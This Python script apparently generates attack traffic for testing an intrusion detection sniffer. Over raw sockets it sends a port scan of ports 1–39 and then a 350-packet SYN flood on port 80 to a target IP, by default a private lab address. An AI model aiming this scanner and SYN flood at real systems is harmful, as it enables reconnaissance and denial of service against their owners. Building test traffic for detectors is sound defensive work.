import sys
import time
import socket
import random

TARGET_IP = sys.argv[2] if len(sys.argv) > 2 else "10.5.0.2"

print(f"[*] Starting Multi-Vector Attack Simulation against [{TARGET_IP}]...")

def create_syn_packet(src_port, dst_port):
    tcp_header = (
        src_port.to_bytes(2, 'big') +        # Source Port
        dst_port.to_bytes(2, 'big') +        # Destination Port
        (0).to_bytes(4, 'big') +             # Seq Number
        (0).to_bytes(4, 'big') +             # Ack Number
        (0x5002).to_bytes(2, 'big') +        # Header Length & SYN Flag
        (64240).to_bytes(2, 'big') +         # Window
        (0).to_bytes(2, 'big') +             # Checksum
        (0).to_bytes(2, 'big')              # Urgent Pointer
    )
    return tcp_header

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

# ==================== 1. PORTSCAN ATTACK ====================
print("\n[!] [1/2] Firing PortScan Attack (Multiple Unique Ports)...")
for port in range(1, 40):
    packet = create_syn_packet(src_port=54321, dst_port=port)
    s.sendto(packet, (TARGET_IP, 0))
    time.sleep(0.01)

print("[+] PortScan Complete! (40 ports probed)")

# CRITICAL FIX: 6 Second Sleep to allow 5s Sniffer Window to reset cleanly
print("\n[*] Waiting 6 seconds for Sniffer Evaluation Window to reset...")
time.sleep(6)

# ==================== 2. DoS SYN FLOOD ATTACK ====================
print("\n[!] [2/2] Firing DoS SYN Flood Attack (Single Target Port 80)...")
for _ in range(350):
    rand_sport = random.randint(1024, 65535)
    packet = create_syn_packet(src_port=rand_sport, dst_port=80) # TARGET PORT 80 ONLY
    s.sendto(packet, (TARGET_IP, 0))

print("[+] DoS SYN Flood Complete! (350 SYN packets burst on port 80)")
print("\n[*] Check Sniffer Terminal for distinct PortScan and DoS_SYN detections!")